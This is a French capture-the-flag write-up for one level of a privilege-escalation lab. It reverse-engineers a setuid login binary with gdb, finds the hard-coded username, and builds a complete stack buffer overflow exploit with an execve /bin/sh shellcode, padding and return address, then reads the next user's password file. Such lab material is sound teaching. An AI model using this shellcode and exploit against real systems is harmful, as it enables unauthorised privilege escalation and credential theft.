## Comportement
- J'ai des droits `level01` que je peux vérifier en tapant `whoami`
- Un binaire est présent avec des droits différents : `-rwsr-s---+ 1 level02 users   7360 Sep 10  2016 level01*`
En exécutant le binaire (`./level01`), on observe:
- qu'il attend un username de notre part.
- qu'il exit si l'username n'est pas le bon.
- qu'il ne segfault pas meme si l'username est tres long.
```shell
********* ADMIN LOGIN PROMPT *********
Enter Username: cuz
verifying username....

nope, incorrect username...
```


## Analyse
En analysant le binaire (`gdb ./level01`) on observe:
- Il n'y a pas qu'un username qui est demande, mais aussi probablement un mot de passe. Logique.
    ```shell
    (gdb) i func
    All defined functions:

    Non-debugging symbols:
    ...
    0x08048464  verify_user_name
    0x080484a3  verify_user_pass
    ...
    ```
- Dans la fonction `verify_user_name` tout d'abord on constate qu'une comparaison est faite entre une variable et une string en dur :
    ```shell
    (gdb) disas verify_user_name
    Dump of assembler code for function verify_user_name:
    0x08048478 <+20>:	mov    $0x804a040,%edx # variable 
    0x0804847d <+25>:	mov    $0x80486a8,%eax # "dat_wil"
    0x08048482 <+30>:	mov    $0x7,%ecx # 7 caracteres
    0x08048487 <+35>:	mov    %edx,%esi
    0x08048489 <+37>:	mov    %eax,%edi
    0x0804848b <+39>:	repz cmpsb %es:(%edi),%ds:(%esi) # strncmp
    ```
- On trouve la valeur de la string ainsi et on verifie : 
    ```shell
    (gdb) x/s 0x804a040
    0x804a040 <a_user_name>:	 ""
    (gdb) x/s 0x80486a8 
    0x80486a8:	 "dat_wil"
    ```
    ```shell
    ********* ADMIN LOGIN PROMPT *********
    Enter Username: dat_wil
    verifying username....

    Enter Password: 
    ```
Il ne nous reste plus qu'a trouver le mot de passe.
- On trouve le meme fonctionnement dans la fonction `verify_user_pass` avec la sring en dur `admin` mais en regardant le code dans `main()` on constate que meme en rentrant le bon mot de passe, tous les chemins passent par la case : `nope, incorrect password...`. De plus, aucun appel a un shell n'est realise dans le code. Il va donc falloir user d'un shellcode et d'un buffer overflow sur `fgets()`


## Résolution
- Il faut trouver l'offset de l'`eip` (le pointeur du jeu d'instruction en cours) pour savoir de combien il faut overflow le buffer. Pour cela on utilise un offset pattern generator qui nous indique que l'offset est de 80 : 
    ```shell
    (gdb) run
    Starting program: /home/users/level01/level01 
    ********* ADMIN LOGIN PROMPT *********
    Enter Username: dat_wil
    verifying username....

    Enter Password: 
    Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
    nope, incorrect password...


    Program received signal SIGSEGV, Segmentation fault.
    0x37634136 in ?? () # egal a 80
    ```
- On prend un shellcode, ici 28 octets : 
    ```shell
    "\x31\xdb\x31\xd2\x31\xc9\x51\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xc0\xb0\x0b\x83\xe4\xf0\xcd\x80"
    ```
- On gere notre padding : 
    - Premier buffer : il faut remplir les 256 octets de fgets(a_user_name, 256, stdin):
        - `dat_wil` :	7 octets
        - shellcode :	28 octets
        - A*221 :		221 octets

    - Deuxième buffer:
        - A*79 :		79 octets
        - EIP :		4 octets = l'adresse de la variable `a_user_name` + 7 octets, pour ne pas prendre en compte `dat_wil`.
- On craft notre payload : 
    ```shell
    python -c 'print "dat_wil"+"\x31\xdb\x31\xd2\x31\xc9\x51\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xc0\xb0\x0b\x83\xe4\xf0\xcd\x80"+"A"*221+"A"*79+"\x47\xa0\x04\x08"' > /tmp/payload
    ```
- On execute : 
    ```shell
    cat /tmp/payload - | ./level01
    ```
- Un shell s'ouvre avec de nouveaux privilèges : en effet, si l'on tape `whoami`, on obtient `level02`.
- Il ne reste plus qu'à :
  - récupérer le password (`cat /home/users/level02/.pass`)
  - quitter le shell (`exit`)
  - et passer au level02 (`su level02`) en renseignant ce password.
